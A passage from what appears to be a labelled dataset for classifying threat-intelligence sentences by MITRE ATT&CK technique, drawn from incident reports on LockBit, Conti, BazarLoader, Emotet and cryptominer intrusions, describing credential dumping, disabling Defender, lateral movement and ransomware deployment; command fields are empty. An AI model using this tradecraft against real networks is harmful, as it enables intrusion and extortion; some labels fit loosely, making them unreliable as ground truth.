    "text": "The user “backup” was created, given a password, and added to the local “Administrator” group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Windows Security events 4720 “A user account was created” and 4732 “A member was added to security enabled local group” show the creation of the user and then adding the user to the Administrators group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This was utilized to create a local administrator user named ‘backup’.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "With the ‘backup’ user, the threat actor was able to RDP to the beachhead with a proxy connection via their Metasploit payload and execute mimikatz.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The mimikatz execution resulted in the disclosure of an easily crackable hash for the ‘Administrator’ account on the beachhead.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Unfortunately, this password was re-used across the hosts in the environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Utilizing the ‘Administrator’ account on a File Server, the threat actor was able to locate cleartext credentials for other privileged accounts account (see ‘Credential Access‘).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Through their RDP session on the beachhead, the threat actor typed ‘virus’ in the start menu search to navigate to the ‘Virus & threat protection’ settings to ensure Windows Defender was completely turned off.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz was executed on the beachhead host just 20 minutes after initial access was performed.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This was visible in the memory on the host as Anydesk wrote the file to disk.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon event code 10 showed that Mimikatz accessed the LSASS process, and we can also see subsequent GrantedAccess for Mimikatz 0x1010 , which translates to: PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and PROCESS_VM_READ (0x0010) .",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon event code 11 shows that the Mimikatz process creates a file called passwords.txt:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the threat actor reviewed the captured passwords by opening the newly generated password file in Notepad, as documented in Sysmon event code 1:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also discovered a txt file on a file share server that contained IT-related cleartext passwords.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Included were the credentials for a Domain Admin account.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "From the Meterpreter session, tasklist was used to enumerate the running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This threat actor identified C2 processes that were established by a different actor and used ‘taskkill’ to end them.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Consequently, they re-exploited Confluence to establish yet another Meterpreter session.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When NetScan is executed with the ‘Check for write access’ option enabled, a ‘delete.me’ file is created then deleted on discovered shares.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the intrusion, RDP was used for lateral movement.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The ‘Remote Desktop Connection’ app (mstsc.exe) was used on the Confluence beachhead to interactively logon to targeted hosts in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Lateral movement with RDP was done to different hosts in swift succession.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "However, there were a few groups of files that were copied to C:\\temp on the beachhead and then deleted about 30 seconds later.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Command and control (C2) connections were established via Metasploit from the breached Confluence server to the IP address 92.51.2[.]22 which is hosted in the provider called Flyservers S.A., reported in other blogs for being used by LockBit affiliates.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The connections were made to the port 4321.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When downloading the Meterpreter HTA stager, the threat actor downloaded it by using a user-agent associated with Internet Explorer.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A second C2 server 92.51.2[.]27 was employed to connect to AnyDesk.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This hostname was observed in the login activity on the beachhead host for this intrusion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The AnyDesk connection was utilized to drop tools to enumerate the infrastructure, access credentials and exfiltrate and encrypt data.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1070.004",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "From the network traffic we see HTTP posts done with rclone:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After around two hours into the intrusion, the threat actor transferred PDQ Deploy and the LockBit Black executable, under the C:\\Temp folder on the beachhead host.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Before the threat actor used PDQ they first ran the LockBit binary manually over RDP sessions on the back server and file server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The next deployment process began with PDQ Deploy being executed from the beachhead system.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "PDQ Deploy allows administrators to execute scripts and commands (e.g., PowerShell, VBScript, and batch files) on remote computers and groups integrated with Spiceworks, Active Directory, or PDQ Inventory.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "PDQDeployRunner-n (e.g., PDQDeployRunner-1) is the target service executed on remote hosts to perform the deployments.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "During deployment, the target service and installation files for the deployment package are copied to a directory on the target computer’s default share, enabling the execution of deployment tasks.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We were able collect the PDQ .db files from C:\\ProgramData\\Admin Arsenal\\PDQ Deploy\\ on the beachhead to see the deployment data created by the threat actor.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Several ways to attempt to execute the ransomware including calling the file, command arguments, and finally the batch file:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Once the threat actor started the deployment we observed both PDQ service runners and the package files (ransomware and batch file) being deployed over SMB.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This batch file was then executed on hosts across the environment via the PDQ runner.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "After completing the deployment using PDQ, the threat actor connected to an Exchange server using RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They issued a few commands to stop running processes associated with Exchange and SQL on the server:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "They then dropped a batch file, test.bat, which contained a list of the systems found earlier during the intrusion, as well as a ransomware execution command.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This appears to have been a backup to try and hit systems that may have been missed during the PDQ deployment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In April, we saw a threat actor go from an initial IcedID infection to deploying Conti ransomware domain wide in two days and 11 hours.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The hands on keyboard activity lasted for two and a half hours.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "They utilized RDP, PsExec, and Cobalt Strike to move laterally within the environment before executing Conti in memory across all active systems.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The JavaScript file would eventually download and execute the IcedID malware.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In order to obtain SYSTEM level privileges, Cobalt Strike’s built-in named piped impersonation (GetSystem) was used:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From here, RDP connections were established from the beachhead host to systems throughout the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The connections were proxied through the IcedID process.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The below traffic shows more details of the RDP session, including the username in the cookie.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This proxied traffic reported back the hostname of the threat actors machine as “mikespc”.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "They then force updated the GPO on all clients using Cobalt Strike.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "LSASS was accessed by an unusual process “runonce.exe” on multiple hosts, including a domain controller.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Rclone was used to exfiltrate company data to Mega and Process Hacker was used to dump LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors executed a Conti batch file on a server which then encrypted most of the domain joined systems.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.",
    "command": "",
    "labels": [
      "T1055",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Having GUI access, they attempted to use ProcessHacker to dump the LSASS process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Most ransomware cases we see involve the threat actor executing code on the DCs.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user’s folder:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder “c:\\users\\public”, and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first was D574.dll,Followed by D8B3.dll.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "D8B3.dll injected into the Winlogon process (high integrity):",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos’, an unusual location and suspicious location for process activity – this is a good detection opportunity where portable executables appear on non-standard file system locations.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "ProcessHacker was also dropped in the root of C:\\ and likely used to access the LSASS process.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Cmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Red Canary provides a good detection guide for RunDLL32; this covers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Remote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon (143.dll) injected into the svchost process ‘svchost.exe -k UnistackSvcGroup -s CDPUserSvc’:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Followed by a request to checkauj[.]com (82.117.252.143).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During this event, we believe that the attacker disclosed the remote workstation name ‘win-344vu98d3ru’.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first DLL [D574.dll] didn’t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The locker.bat is a bespoke script designed to encrypt files across a number of hosts:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Analysis of the DLLs accompanying the EXE indicates Conti artifacts:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts – likely to validate and assess that the locker encryption was successful:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Using this exploit, they downloaded and executed an xml file, which included a PowerShell command to download and execute a script.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script does multiple things, such as download XMRig and its config, rename XMRig to sysupdate, schedule a task for it’s update process, and confirm the miner is running.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploiting CVE-2020-14882.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In the above screenshot, the threat actor executes wbw.xml which then downloads and executes 1.ps1.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script then downloads and executes XMRig, renames it to sysupdate and then sets a schedule task, which runs update.ps1.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors began enumerating the network once Emotet deployed a Cobalt Strike beacon on the beachhead host.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Since then, Emotet has been testing different initial access payloads while its developers were busy improving the core functionality of the actual malware.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003",
      "T1071.001",
      "T1082",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This entailed connecting to various email servers and sending new emails with attached xls and zip files.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera–for an additional means of persistence and command and control.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor gained access to the environment after a user opened an Excel document and enabled macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll .",
    "command": "",
    "labels": [
      "T1059.003",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Emotet injected multiple times into svchost to execute certain functions, including discovery commands.",
    "command": "",
    "labels": [
      "T1016",
      "T1055",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We’ve seen these threat actors get blocked by Defender and then minutes later Defender Control gets copied over and run.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Defender Control can be run via GUI or command line",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Let’s click Disable Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We can now see that the entire menu has vanished, and Windows tells you that the Organization is managing Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Defender Control also unloads the Defender driver:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
